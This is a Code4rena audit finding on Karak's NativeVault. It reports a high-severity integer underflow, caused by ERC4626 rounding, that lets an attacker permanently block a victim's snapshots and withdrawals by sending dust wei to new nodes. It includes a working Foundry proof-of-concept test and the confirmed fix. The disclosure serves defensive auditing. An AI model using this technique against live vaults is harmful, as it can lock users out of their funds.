---
tags:
  - lang/solidity
  - sector/governance
  - sector/restaking
  - sector/staking
  - sector/vault
  - platform/code4rena
  - has/github
  - has/poc
  - severity/high
  - vuln/arithmetic/underflow
  - novelty/known-pattern
  - misassumption/math-is-safe
  - fix/fix-arithmetic
protocol: "[[Karak]]"
auditors:
  - "[[KupiaSec]]"
report: "https://code4rena.com/reports/2024-07-karak"
genome:
  - "[[underflow]]"
  - "[[known-pattern]]"
  - "[[permanent]]"
  - "[[dos-resistance]]"
  - "[[integer-bounds]]"
  - "[[timestamp-dependence]]"
---
# [H-03] A `DoS` on snapshots due to a rounding error in calculations

- id: 41067
- impact: HIGH
- protocol: [[Karak]]
- reporter: KupiaSec (Code4rena)
- source: https://code4rena.com/reports/2024-07-karak

## Summary


This bug report discusses a potential issue with creating a snapshot due to a rounding error in the calculations. The report includes a proof of concept which demonstrates how the error can occur and provides a recommended mitigation step to fix the issue. The report also includes comments from the warden, judge, and Karak, discussing the severity and potential impact of the bug. A coded proof of concept is also provided to further illustrate the issue. The bug has been confirmed and a mitigation has been implemented to address the issue.

## Details


Creating a snapshot may be impossible due to a rounding error in the calculations.

### Proof of Concept

When initiating a snapshot, some assets are transferred to the slash store within the `_transferToSlashStore()` function. The transfer amount is calculated at `L430`. However, if `convertToAssets(balanceOf(nodeOwner))` exceeds `node.totalRestakedETH` (which could occur due to a rounding error in the calculations), the transaction will revert due to an integer underflow.

```solidity
    function _transferToSlashStore(address nodeOwner) internal {
        ...

430     uint256 slashedAssets = node.totalRestakedETH - convertToAssets(balanceOf(nodeOwner));
        ...
```

Consider the following scenario:

**Note:** The exchange rate formula is `(totalAssets + 1) / (totalSupply + 1)` as defined in [ERC4626](https://github.com/vectorized/solady/blob/main/src/tokens/ERC4626.sol#L201).

1.  Current state of the `NativeVault`:
    *   `totalAssets` = 3e18
    *   `totalSupply` = 5e18
    *   Bob's share = (5e18 - 4) / 2
    *   Bob's assets = (5e18 - 4) / 2 &ast; (3e18 + 1) / (5e18 + 1) = 1.5e18 - 2
    *   `totalRestakedETH` for Bob's node = 1.5e18 - 2
2.  An increase in totalAssets by 3:
    *   Corresponding share = 3 &ast; (5e18 + 1) / (3e18 + 1) = 4
    As a result:
    *   `totalAssets` = 3e18 + 3
    *   `totalSupply` = 5e18 + 4
    *   Bob's assets = (5e18 - 4) / 2 &ast; (3e18 + 4) / (5e18 + 5) = 1.5e18 - 1
    *   `totalRestakedETH` for Bob's node = 1.5e18 - 2

In this situation, Bob's snapshot will revert because `convertToAssets(balanceOf(nodeOwner))` is greater than `node.totalRestakedETH`.

This issue arises from calculation rounding errors. As seen in the scenario above, the issue can arise even with a single increase in totalAssets, and the likelihood of this problem grows as the number of participants increases.

Additionally, attackers could exploit this vulnerability to execute a `DoS` attack on others' snapshots by transfering DUST ethers to the nodeAddress and performing the second step of the above scenario.

### Recommended Mitigation Steps

The `_transferToSlashStore()` function should be fixed as follows:

```diff
-       uint256 slashedAssets = node.totalRestakedETH - convertToAssets(balanceOf(nodeOwner));

+       uint256 slashedAssets;
+       if(node.totalRestakedETH > convertToAssets(balanceOf(nodeOwner))) {
+           slashedAssets = node.totalRestakedETH - convertToAssets(balanceOf(nodeOwner));
+       }
```

**[MiloTruck (judge) commented](https://github.com/code-423n4/2024-07-karak-findings/issues/36#issuecomment-2282812331):**
 > The PoC provided has the following step:
> 
> > Current state of the NativeVault:
> >
> > - totalAssets = 3e18
> > - totalSupply = 5e18
> 
> How would a native vault reach such a state? 32 ETH is required to activate a validator, and the minimum balance for a validator is 16 ETH. This means a native vault with at least one active validator in it would have `totalAssets` no smaller than `16e18`.
> 
> The issue hasn't described how it is possible for the native vault to reach a state where `totalAssets = 3e18` and `totalSupply = 5e18`, and it is not immediately obvious when looking at the code.
>  
> > An increase in totalAssets by 3:
> > - Corresponding share = 3 * (5e18 + 1) / (3e18 + 1) = 4
> 
> `totalAssets` is only increased in `_increaseBalance()`, which is only called in `validateWithdrawalCredentials()` and `_updateSnapshot()`.
> 
> `validateWithdrawalCredentials()` is used to add new validators, so it is impossible that `totalAssets` increases by only 3 when it is called. Note that validator balances are in gwei on the beacon chain. Also, the calculation for assets in `_updateSnapshot()` is complex - you can't simply state that `totalAssets` will increase by 3 without describing how.
> 
> As such, I believe this issue has not demonstrated sufficient proof of how `convertToAssets(balanceOf(nodeOwner))` can become larger than `node.totalRestakedETH`.
> 
> If the warden genuinely feels that the underflow can occur, I encourage them to provide a coded PoC that interacts with `NativeVault`.

**[karan-andalusia (Karak) commented](https://github.com/code-423n4/2024-07-karak-findings/issues/36#issuecomment-2288634004):**
 > Fixed this with:
> ```
> uint256 slashedAssets;
> // Account for rounding errors which might make convertToAssets() > totalRestakedETH
> if (node.totalRestakedETH > convertToAssets(balanceOf(nodeOwner))) {
>     // slashed ETH = total restaked ETH (node + beacon) - share price equivalent ETH
>     slashedAssets = node.totalRestakedETH - convertToAssets(balanceOf(nodeOwner));
> }
> ```

**[KupiaSec (warden) commented](https://github.com/code-423n4/2024-07-karak-findings/issues/36#issuecomment-2292936584):**
 > Hi, @MiloTruck!
> 
> Thank you for your encouragement! I have made a coded PoC along with a detailed description.
> 
> **The primary reason for this issue**<br>
> 
> Since a nativeVault is an ERC4626, all rounding in calculations is managed for the benefit of the protocol. Consequently, if there is no slashing, the asset amount per share can only increase due to rounding. As the frequency of deposits and withdrawals rises, this effect may become more pronounced.
> 
> This could lead to overflows at [L430](https://github.com/code-423n4/2024-07-karak/blob/main/src/NativeVault.sol#L430), because `convertToAssets(balanceOf(nodeOwner))` may increase due to the aforementioned reasons.
> 
> https://github.com/code-423n4/2024-07-karak/blob/main/src/NativeVault.sol#L425-L446
> ```solidity
>     function _transferToSlashStore(address nodeOwner) internal {
>         NativeVaultLib.Storage storage self = _state();
>         NativeVaultLib.NativeNode storage node = self.ownerToNode[nodeOwner];
> 
>         // slashed ETH = total restaked ETH (node + beacon) - share price equivalent ETH
> @>      uint256 slashedAssets = node.totalRestakedETH - convertToAssets(balanceOf(nodeOwner));
>             [...]
>     }
> ```
> 
> **Note**<br>
> 
> Before detailing the coded PoC, I want to clarify that the totalAssets can increase through donations to nativeNode. The donated amount can be any arbitrary number (the original report uses 3), which may not necessarily be a multiple of GEWI.
> (Donations are feasible because the NativeNode inherits from the Ownable contract, which includes the payable function `cancelOwnershipHandover()`, allowing anyone to call it. Even in the absence of the payable function cancelOwnershipHandover(), there are alternative methods available.)
> 
> **Scenario:**
> 
> 1. Bob has a validator with 32 ETH.
>     - `totalAssets` = 32e18
>     - `totalSupply` = 32e18
>     - Bob's share = 32e18
>     - Bob's assets = 32e18
>     - `totalRestakedETH` for Bob's node = 32e18
> 2. The native vault is slashed by 2 ETH.
>     - `totalAssets` = 30e18
>     - `totalSupply` = 32e18
>     - Bob's share = 32e18
>     - Bob's assets = 30e18
>     - `totalRestakedETH` for Bob's node = 30e18
> 3. An attacker creates a node and sends 15 wei to it.
>     - Corresponding share = 15 * (32e18 + 1) / (30e18 + 1) = 15
>     
>     As a result:
>     - `totalAssets` = 30e18 + 15
>     - `totalSupply` = 32e18 + 15
> 4. The attacker creates another node and sends 15 wei to it.
>     - Corresponding share = 15 * (32e18 + 16) / (30e18 + 16) = 15
>     
>     As a result:
>     - `totalAssets` = 30e18 + 30
>     - `totalSupply` = 32e18 + 30
>     - Bob's assets = 32e18 * (30e18 + 31) / (32e18 + 31) = 30e18 + 1
>     - `totalRestakedETH` for Bob's node = 30e18
> 
> In this situation, Bob's snapshot will revert because `convertToAssets(balanceOf(nodeOwner))` is greater than `node.totalRestakedETH`.
> 
> **Coded PoC**
> 
> In this PoC, I only utilize Bob's native node, not his validator, which does not result in any numerical differences.
> 
> **Before testing**, insert the following code snippet into `NativeVault.sol`, as there is no view function to retrieve the value of `totalRestakedETH` for nodes.
> 
> <details>
> 
> ```solidity
> NativeVault.sol
> 
>     function getNodeTotalRestakedETH(address owner) external view returns (uint256 totalRestakedETH) {
>         return _state().ownerToNode[owner].totalRestakedETH;
>     }
> ```
> 
> ```solidity
> NativeVault.t.sol
> 
>     function test_rounding_error() public {
> 
>         ////////////
>         // STEP 1 //
>         ////////////
> 
>         // Consider Bob's address to be address(this)
>         // Create bob's node
>         address bobNode = nativeVault.createNode();
>         assertEq(nativeVault.getNodeOwner(bobNode), address(this));
> 
>         // Bob's node has 32 ETH (the same effect as if Bob had a validator.)
>         vm.deal(bobNode, 32 ether);
>         assertEq(bobNode.balance, 32 ether);
> 
>         // Need to store the parent root before starting the snapshot
>         vm.store(Constants.BEACON_ROOTS_ADDRESS, timestamp_idx(block.timestamp), bytes32(uint256(block.timestamp)));
>         vm.store(Constants.BEACON_ROOTS_ADDRESS, root_idx(block.timestamp), bytes32(0x00));
>         // start snapshot
>         nativeVault.startSnapshot(false);
> 
>         assertEq(nativeVault.getNodeTotalRestakedETH(address(this)), 32 ether);
>         assertEq(nativeVault.convertToAssets(nativeVault.balanceOf(address(this))), 32 ether);
>         assertEq(nativeVault.totalAssets(), 32 ether);
> 
>         ////////////
>         // STEP 2 //
>         ////////////
> 
>         vm.prank(address(core));
>         nativeVault.slashAssets(2 ether, address(slashStore));
>         // slashing succesfull
>         assertEq(nativeVault.totalAssets(), 30 ether);
>         
>         vm.prank(address(this));
>         // During a call to startSnapshot, slashed ether will be swept and totalRestakedETH decremented
>         nativeVault.startSnapshot(false);
>         
>         assertEq(nativeVault.getNodeTotalRestakedETH(address(this)), 30 ether);
>         assertEq(nativeVault.convertToAssets(nativeVault.balanceOf(address(this))), 30 ether);
>         assertEq(nativeVault.totalAssets(), 30 ether);
> 
>         ////////////
>         // STEP 3 //
>         ////////////
> 
>         // Create the attacker's node
>         address attacker = address(2);
>         vm.prank(attacker);
>         address attackerNode = nativeVault.createNode();
>         assertEq(nativeVault.getNodeOwner(attackerNode), attacker);
> 
>         // The attacker sends 15 wei to the node
>         vm.deal(attackerNode, 15 wei);
>         assertEq(attackerNode.balance, 15 wei);
> 
>         vm.prank(attacker);
>         nativeVault.startSnapshot(false);
>         
>         assertEq(nativeVault.getNodeTotalRestakedETH(address(this)), 30 ether);
>         assertEq(nativeVault.convertToAssets(nativeVault.balanceOf(address(this))), 30 ether);
>         assertEq(nativeVault.totalAssets(), 30 ether + 15 wei);
> 
>         ////////////
>         // STEP 4 //
>         ////////////
> 
>         // Create the attacker's another node
>         address attacker3 = address(3);
>         vm.prank(attacker3);
>         address attackerNode3 = nativeVault.createNode();
>         assertEq(nativeVault.getNodeOwner(attackerNode3), attacker3);
> 
>         // The attacker sends 15 wei to the node
>         vm.deal(attackerNode3, 15 wei);
>         assertEq(attackerNode3.balance, 15 wei);
> 
>         vm.prank(attacker3);
>         nativeVault.startSnapshot(false);
>         
>         // The following illustrates the difference between the two values, which will revert Bob's snapshot
>         assertEq(nativeVault.getNodeTotalRestakedETH(address(this)), 30 ether);
>         assertEq(nativeVault.convertToAssets(nativeVault.balanceOf(address(this))), 30 ether + 1 wei);
> 
>         // Bob's snapshot will revert
>         vm.prank(address(this));
>         vm.expectRevert();
>         nativeVault.startSnapshot(false);
>     }
> ```
> 
> </details>

**[MiloTruck (judge) increased severity to High and commented](https://github.com/code-423n4/2024-07-karak-findings/issues/36#issuecomment-2299640443):**
 > Thanks for providing the detailed example and the coded PoC, this is a good find!
> 
> `_startSnapshot()` is core functionality of the native vault, and if it is permanently DOSed, the user [might not be able to withdraw](https://github.com/code-423n4/2024-07-karak/blob/main/src/NativeVault.sol#L243-L245). As such, I believe this warrants high severity.
> 
> > totalRestakedEth for Bob will only decrease when shares are being burnt, which happens during update! so it remains 32e18!
> 
> We assume `startSnapshot()` is called once in step 2 before the attack is performed.

**[Karak mitigated](https://github.com/code-423n4/2024-09-karak-mitigation?tab=readme-ov-file#scope):**
> This mitigation introduces a check for the rounding error.

**Status:** Mitigation confirmed. Full details in reports from [sl1](https://github.com/code-423n4/2024-09-karak-mitigation-findings/issues/13), [KupiaSec](https://github.com/code-423n4/2024-09-karak-mitigation-findings/issues/25) and [0xCiphky](https://github.com/code-423n4/2024-09-karak-mitigation-findings/issues/7).

***
